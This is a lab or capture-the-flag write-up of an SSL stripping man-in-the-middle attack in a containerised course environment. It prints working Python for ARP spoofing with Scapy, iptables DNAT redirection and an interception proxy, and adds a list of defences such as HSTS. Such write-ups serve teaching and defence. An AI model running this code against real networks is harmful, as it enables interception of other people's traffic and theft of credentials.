# Writeup – SSL Stripping Attack

This challenge involved implementing an **SSL stripping attack** to downgrade HTTPS connections to HTTP, allowing interception of encrypted communications. The attack combines ARP spoofing, traffic redirection, and HTTP proxy techniques to perform a sophisticated man-in-the-middle attack.

---

## 🔍 Challenge Overview

The SSL stripping attack targets the trust model between HTTP and HTTPS by positioning an attacker between the victim and legitimate servers. The attack downgrades secure HTTPS connections to unencrypted HTTP, allowing interception of sensitive data that users believe is encrypted.

### 🎯 Key Attack Components:
- **ARP Spoofing** to intercept network traffic
- **Traffic Redirection** using iptables NAT rules
- **HTTP Proxy Server** to strip SSL/TLS encryption
- **Man-in-the-Middle Positioning** for traffic interception

---

## 🛠️ My Implementation Approach

### 1. **Network Infrastructure Setup**
Configured iptables rules for traffic interception and redirection:
```python
def init():
    # Reset iptables rules
    subprocess.call('iptables -F'.split())
    subprocess.call('iptables -t nat -F'.split())
    subprocess.call('iptables -t mangle -F'.split())

    # Enable IP forwarding
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

    # Set up NAT and redirect incoming traffic to the fake server on port 8080
    subprocess.call('iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE'.split())
    subprocess.call('iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT'.split())
    subprocess.call('iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT'.split())
    subprocess.call('iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.166.97 --dport 80 -j DNAT --to-destination 10.0.0.3:8080'.split())
```

### 2. **ARP Spoofing Implementation**
Used Scapy to continuously send spoofed ARP responses:
```python
def arp_spoof():
    alice_ip = "10.0.0.2"
    gateway_ip = "10.0.0.1"
    interface = "eth0"

    # Continuously send spoofed ARP responses
    send(ARP(op="is-at", psrc=gateway_ip, pdst=alice_ip, hwsrc=get_if_hwaddr(interface)), inter=1, loop=1)
```

### 3. **SSL Stripping Proxy Server**
Developed a custom HTTP server that acts as a transparent proxy:
```python
class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        headers = self.headers
        
        if path == "/check":
            # Connect to the real server over HTTPS
            conn = HTTPSConnection("welcome.seclab.space")
            conn.request("GET", path, headers=headers)
            res = conn.getresponse()
            data = res.read()
            
            # Intercept and log the flag
            with open(self.filepath, "wb") as f:
                f.write(data)
                print("Flag written to file:", data.decode("utf-8"))
```

### 4. **Docker Container Architecture**
Configured multi-network container environment:
```yaml
services:
  alice:
    container_name: alice
    image: thierrysans/alice:ssl-stripping
    networks:
      legitimate:
        ipv4_address: 10.0.0.2

  mallory:
    image: thierrysans/mallory:ssl-stripping
    container_name: mallory
    privileged: true
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    networks:
      malicious:
        ipv4_address: 10.0.1.3
      legitimate:
        ipv4_address: 10.0.0.3
```

---

## 🔬 Technical Attack Flow

### Step-by-Step Exploitation
1. **Network Initialization**: Configure iptables rules for traffic redirection
2. **ARP Spoofing Launch**: Position attacker as default gateway
3. **Proxy Server Deployment**: Start HTTP proxy on port 8080
4. **Traffic Interception**: Capture victim's network communications
5. **SSL Stripping**: Downgrade HTTPS requests to HTTP responses
6. **Data Extraction**: Intercept sensitive information from unencrypted traffic

### Network Architecture
```
Alice (Victim) ←→ Mallory (Attacker) ←→ Legitimate Server
   10.0.0.2         10.0.0.3           welcome.seclab.space
      ↑                 ↑                      ↑
   HTTP Requests    SSL Stripping         HTTPS Connections
```

### Attack Timeline
```
1. Alice intends to visit HTTPS site
2. ARP spoofing redirects traffic to Mallory
3. Mallory receives HTTP request from Alice
4. Mallory forwards request as HTTPS to real server
5. Server responds with HTTPS content to Mallory
6. Mallory strips SSL and sends HTTP response to Alice
7. Alice receives unencrypted content, believing it's secure
```

---

## 🧪 Implementation Details

### ARP Spoofing Mechanism
- **Continuous ARP responses** claiming gateway identity
- **MAC address spoofing** to intercept traffic
- **Network positioning** between victim and gateway
- **Scapy integration** for reliable packet generation

### HTTP Proxy Functionality
- **Transparent proxying** of HTTP requests
- **HTTPS upstream connections** to legitimate servers
- **SSL certificate stripping** from responses
- **Content modification** to maintain attack persistence

### Traffic Redirection
- **iptables NAT rules** for port redirection
- **IP forwarding** to maintain connectivity
- **Masquerading** for return traffic routing
- **DNAT redirection** to proxy server port

---

## 🏆 Attack Success

The SSL stripping attack successfully:
- ✅ **Positioned attacker** as man-in-the-middle
- ✅ **Intercepted HTTPS traffic** intended for legitimate server
- ✅ **Downgraded SSL connections** to unencrypted HTTP
- ✅ **Captured sensitive data** from victim communications
- ✅ **Maintained attack persistence** throughout session

### 🎯 Result: **Complete Traffic Interception**

The attack successfully intercepted and logged sensitive information that the victim believed was transmitted securely over HTTPS.

---

## 🛡️ Defense Mechanisms

### SSL/TLS Security Enhancements
1. **HTTP Strict Transport Security (HSTS)**: Force HTTPS connections
2. **Certificate Pinning**: Validate specific certificates
3. **Perfect Forward Secrecy**: Protect past communications
4. **Certificate Transparency**: Monitor certificate issuance
5. **HTTPS Everywhere**: Browser extensions forcing HTTPS

### Network Security Measures
```http
# HSTS Header Example
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Client-Side Protections
- **Browser security indicators** for HTTPS connections
- **Mixed content warnings** for HTTP/HTTPS combinations
- **Certificate validation** and warning systems
- **Network monitoring** for ARP spoofing detection

---

## 📚 Key Learnings

1. **Man-in-the-Middle Attacks**: Positioning and traffic interception techniques
2. **Network Security**: ARP spoofing and traffic redirection methods
3. **SSL/TLS Vulnerabilities**: Understanding protocol downgrade attacks
4. **Proxy Development**: Building transparent HTTP/HTTPS proxies
5. **Container Networking**: Multi-network security testing environments
6. **Defense Strategies**: Modern protections against SSL stripping

---

## 🎯 Educational Value

This challenge demonstrated:
- **Real-world attack scenarios** against encrypted communications
- **The importance of HSTS** and other SSL security measures
- **Network-level security vulnerabilities** in modern infrastructure
- **Container-based security testing** methodologies
- **The evolution of web security** from basic encryption to comprehensive protection

---

## 🔒 Ethical Considerations

This implementation teaches:
- **Understanding attack vectors** to build better defenses
- **The critical importance** of end-to-end encryption validation
- **Network security monitoring** and intrusion detection
- **Secure development practices** for web applications
- **User education** about HTTPS security indicators

---

## 📁 Files Overview

- [`attack.py`](./attack.py) - Complete SSL stripping attack implementation
- [`server.py`](./server.py) - Custom HTTP proxy server for SSL stripping
- [`docker-compose.yml`](./docker-compose.yml) - Multi-network container environment
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge showcased advanced network security skills and demonstrated the critical importance of implementing comprehensive SSL/TLS protections in modern web applications and network infrastructure.